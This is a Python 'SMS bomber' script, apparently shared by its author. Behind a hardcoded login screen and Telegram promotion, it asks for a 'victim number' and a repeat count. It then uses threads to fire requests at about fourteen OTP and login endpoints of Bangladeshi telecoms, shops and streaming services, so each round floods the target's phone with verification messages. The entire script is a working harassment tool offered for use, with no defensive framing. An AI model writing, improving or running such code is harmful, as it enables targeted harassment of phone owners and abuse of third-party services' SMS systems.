import requests
import threading
import os
import sys

# Developer: RX NAFIJ
line = "\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

logo2 = """\033[1;33m
    ▄▖▖▖  ▄▖▖  ▖▄▖  ▄ ▄▖▖  ▖▄ ▄▖▄▖
    ▙▘▚▘  ▚ ▛▖▞▌▚   ▙▘▌▌▛▖▞▌▙▘▙▖▙▘
    ▌▌▌▌  ▄▌▌▝ ▌▄▌  ▙▘▙▌▌▝ ▌▙▘▙▖▌▌ """

logo = """\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ [\033[1;97m•\033[1;32m]\033[1;97m OWNER       :  RX_NAFIJ          \033[1;32m┃
┃ [\033[1;97m•\033[1;32m]\033[1;97m TOOLS TYPE  :  SMS BOMBER        \033[1;32m┃
┃ [\033[1;97m•\033[1;32m]\033[1;97m TELEGRAM    :  NAFIJ01           \033[1;32m┃
┃ [\033[1;97m•\033[1;32m]\033[1;97m VERSION     :  1.0 (FREE)        \033[1;32m┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[1;m"""

GREEN = "\033[1;32m"
RED = "\033[1;31m"
RESET = "\033[0m"
CYAN = "\033[1;36m"

# লগিন সিস্টেম ফাংশন
def login_system():
    os.system('clear')
    print(logo2)
    print(logo)
    print(f" {CYAN}   --- LOGIN SYSTEM ---")
    print(line)
    
    username = input(f" {GREEN} [{RESET}•{GREEN}]{RESET} ENTER USERNAME: ")
    password = input(f" {GREEN} [{RESET}•{GREEN}]{RESET} ENTER PASSWORD: ")
    
    if username == "TEAM" and password == "RX":
        print(f"\n {GREEN}[√] LOGIN SUCCESSFUL! WELCOME TO RX TOOLS.")
        os.system('sleep 2')
    else:
        print(f"\n {RED} [×] WRONG DETAILS! PLEASE CONTACT OWNER.")
        os.system('xdg-open https://t.me/NAFIJ_01')
        sys.exit()

def send_request(api, target, round_num, index):
    num_normal = target
    num_880 = "88" + target if not target.startswith("88") else target
    num_plus_880 = "+88" + target if not target.startswith("+88") else target

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Referer': 'https://www.google.com/'
    }

    try:
        url = api["url"]
        method = api.get("method", "POST")
        payload = api.get("data", {}).copy()

        if "msisdn" in payload: payload["msisdn"] = num_normal
        elif "number" in payload: payload["number"] = num_plus_880 if "deeptoplay" in url or "chorki" in url else num_normal
        elif "phoneNumber" in payload: payload["phoneNumber"] = num_normal
        elif "mobile" in payload: payload["mobile"] = num_880 if "toffeelive" in url else num_normal
        elif "phone" in payload: payload["phone"] = num_normal

        if method == "GET":
            if "banglalink" in url:
                final_url = f"https://web-api.banglalink.net/api/v1/user/number/validation/{num_normal}?type=1"
            elif "bikroy" in url:
                final_url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num_normal}"
            else:
                final_url = url
            response = requests.get(final_url, headers=headers, timeout=10)
        else:
            response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code in [200, 201]:
            print(f"{GREEN}[Round {round_num}] API {index+1}: SUCCESS (Sent){RESET}")
        else:
            print(f"{RED}[Round {round_num}] API {index+1}: FAILED ({response.status_code}){RESET}")

    except Exception:
        print(f"{RED}[Round {round_num}] API {index+1}: ERROR!{RESET}")

def start_bombing():
    os.system('clear')
    os.system('xdg-open https://t.me/teamrx1')
    print(logo2)
    print(logo)
    print("  [\033[1;97m•\033[1;32m] \033[1;36mMOST POWERFUL SMS BOMBER")
    print(line)
    target = input("  [\033[1;97m•\033[1;32m]  VICTIM NUMBER : ")
    limit = int(input("  [\033[1;97m•\033[1;32m]  SMS LIMIT : "))
    print(line)

    api_configs = [
        {"url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "data": {"msisdn": ""}},
        {"url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "data": {"number": ""}},
        {"url": "https://api.apex4u.com/api/auth/login", "data": {"phoneNumber": ""}},
        {"url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "data": {"number": ""}},
        {"url": "https://www.pickaboo.com/rest/default/V1/customer-check/exist", "data": {"mobile": ""}},
        {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login", "method": "GET"},
        {"url": "https://prod-services.toffeelive.com/sms/v1/subscriber/signup", "data": {"mobile": ""}},
        {"url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "data": {"number": ""}},
        {"url": "https://web-api.banglalink.net/api/v1/user/number/validation/", "method": "GET"},
        {"url": "https://api.shajgoj.com/api/v2/auth/send-otp", "data": {"mobile": ""}},
        {"url": "https://care.banglalink.net/api/v1/auth/send-otp", "data": {"msisdn": ""}},
        {"url": "https://www.daraz.com.bd/customer/api/send_otp", "data": {"phone": ""}},
        {"url": "https://api.foodpanda.com.bd/api/v1/login/otp", "data": {"phone": ""}},
        {"url": "https://api.osudpotro.com/api/v1/users/send_otp", "data": {"phoneNumber": ""}}
    ]

    print(f"\n  [\033[1;97m•\033[1;32m] \033[1;36m] Bombing starts at every limit {len(api_configs)} sms send {RESET}\n")

    for r in range(1, limit + 1):
        threads = []
        for i, config in enumerate(api_configs):
            t = threading.Thread(target=send_request, args=(config, target, r, i))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

    print(f"\nSUCCESFULLY SENT YOUR BOMBING..!💣{RESET}")

if __name__ == "__main__":
    login_system() # প্রথমে লগিন চেক করবে
    start_bombing() # সঠিক হলে বোম্বিং শুরু হবে